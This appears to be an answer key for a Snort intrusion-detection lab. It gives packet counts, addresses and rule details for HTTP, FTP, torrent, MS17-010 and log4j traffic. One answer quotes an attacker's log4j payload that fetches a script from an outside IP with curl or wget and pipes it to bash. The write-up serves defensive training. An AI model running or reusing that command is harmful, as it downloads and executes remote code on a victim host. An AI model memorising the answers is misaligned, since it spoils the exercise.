# Snort Challenge - The Basics

## [Task 1] Introduction

## [Task 2] Writing IDS Rules: HTTP

**[Task 2, Question 1] What is the number of detected packets?** - 164

**[Task 2, Question 2] What is the destination address of packet 63?** - `216.239.59.99`

**[Task 2, Question 3] What is the ACK number of packet 64?** - 0x2E6B5384

**[Task 2, Question 4] What is the SEQ number of packet 62?** - 0x36C21E28

**[Task 2, Question 5] What is the TTL of packet 65?** - 128

**[Task 2, Question 6] What is the source IP of packet 65?** - `145.254.160.237`

**[Task 2, Question 7] What is the source port of packet 65?** - 3372

## [Task 3] Writing IDS Rules: FTP

**[Task 3, Question 1] What is the number of detected packets?** - 307

**[Task 3, Question 2] What is the FTP service name?** - Microsoft FTP Service

**[Task 3, Question 3] What is the number of detected packets?** - 41

**[Task 3, Question 4] What is the number of detected packets?** - 1

**[Task 3, Question 5] What is the number of detected packets?** - 42

**[Task 3, Question 6] WHat is the number of detected packets?** - 7

## [Task 4] Writing IDS Rules: PNG

**[Task 4, Question 1] Investigate the logs and identify the software name embedded in the packet.** - Adobe ImageReady

**[Task 4, Question 2] Investigate the logs and identify the image format embedded in the packet.** - GIF89a

## [Task 5] Writing IDS Rules: Torrent Metafile

**[Task 5, Question 1] What is the number of detected packets?** - 2

**[Task 5, Question 2] What is the name of the torrent application?** - bittorrent

**[Task 5, Question 3] What is the MIME (Multipurpose Internet Mail Extensions) type of the torrent metafile?** - application/x-bittorrent

**[Task 5, Question 4] What is the hostname of the torrent metafile?** - `tracker2.torrentbox.com`

## [Task 6] Troubleshooting Rule Syntax Errors

**[Task 6, Question 1] What is the number of the detected packets?** - 16

**[Task 6, Question 2] What is the number of the detected packets?** - 68

**[Task 6, Question 3] What is the number of the detected packets?** - 87

**[Task 6, Question 4] What is the number of the detected packets?** - 90

**[Task 6, Question 5] What is the number of the detected packets?** - 155

**[Task 6, Question 6] What is the number of the detected packets?** - 2

**[Task 6, Question 7] What is the name of the required option?** - msg

## [Task 7] Using External Rules: MS17-010

**[Task 7, Question 1] What is the number of detected packets?** - 25154

**[Task 7, Question 2] What is the number of detected packets?** - 12

**[Task 7, Question 3] What is the requested path?** - `\\192.168.116.138\IPC$`

**[Task 7, Question 4] What is the CVSS v2 score of the MS17-010 vulnerability?** - 9.3

## [Task 8] Using External Rules: log4j

**[Task 8, Question 1] What is the number of detected packets?** - 26

**[Task 8, Question 2] How many rules were triggered?** - 4

**[Task 8, Question 3] What are the first six digits of the triggered rule SIDs?** - 210037

**[Task 8, Question 4] What is the number of detected packets?** - 41

**[Task 8, Question 5] What is the name of the used encoding algorithm?** - Base64

**[Task 8, Question 6] What is the IP ID of the corresponding packet?** - 62808

**[Task 8, Question 7] What is the attacker's command?** - `(curl -s 45.155.205.233:5874/162.0.228.253:80||wget -q -O- 45.155.205.233:5874/162.0.228.253:80)|bash`

**[Task 8, Question 8] What is the CVSS v2 score of the Log4j vulnerability?** - 9.3
